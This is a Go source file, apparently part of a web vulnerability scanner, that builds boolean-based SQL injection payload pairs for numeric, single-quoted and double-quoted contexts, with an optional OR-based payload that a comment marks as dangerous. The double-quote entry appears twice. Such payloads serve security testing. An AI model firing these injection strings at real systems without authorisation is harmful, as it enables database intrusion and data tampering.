/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package sqli_payload

import (
	"fmt"
	"wscan/core/utils"
)

type BooleanedPayload struct {
	TruePayload  string
	FalsePayload string
	Describe     string
}

func GetBooleanedPayload() []BooleanedPayload {
	return GetBooleanedPayloadWithConfig(false)
}

func GetBooleanedPayloadWithConfig(useComment bool) []BooleanedPayload {
	rndNum := utils.RandInt(0, 100)
	rndNum = rndNum + 5379
	rndNumPlusOne := rndNum + 1
	payloads := []BooleanedPayload{

		{TruePayload: fmt.Sprintf("/**/and+%d=%d", rndNum, rndNum), FalsePayload: fmt.Sprintf("/**/and+%d=%d", rndNum, rndNumPlusOne), Describe: "Generic boolean based case [number]"},
		{TruePayload: fmt.Sprintf(" AND %d=%d ", rndNum, rndNum), FalsePayload: fmt.Sprintf(" AND %d=%d ", rndNum, rndNumPlusOne), Describe: "numeric"},
		{TruePayload: fmt.Sprintf("' AND '%d'='%d", rndNum, rndNum), FalsePayload: fmt.Sprintf("' AND '%d'='%d", rndNum, rndNumPlusOne), Describe: "stringsingle"},
		{TruePayload: fmt.Sprintf(`" AND "%d"="%d`, rndNum, rndNum), FalsePayload: fmt.Sprintf(`" AND "%d"="%d`, rndNum, rndNumPlusOne), Describe: "Double quotes"},
		{TruePayload: fmt.Sprintf(`" AND "%d"="%d`, rndNum, rndNum), FalsePayload: fmt.Sprintf(`" AND "%d"="%d`, rndNum, rndNumPlusOne), Describe: "Double quotes"},
	}
	// When useComment is true, add OR-based payloads (dangerous: may modify data)
	if useComment {
		payloads = append(payloads, BooleanedPayload{
			TruePayload:  fmt.Sprintf("/**/OR+%d=%d", rndNum, rndNum),
			FalsePayload: fmt.Sprintf("/**/OR+%d=%d", rndNum, rndNumPlusOne),
			Describe:     "OR-based comment case [DANGEROUS]",
		})
	}
	return payloads
}
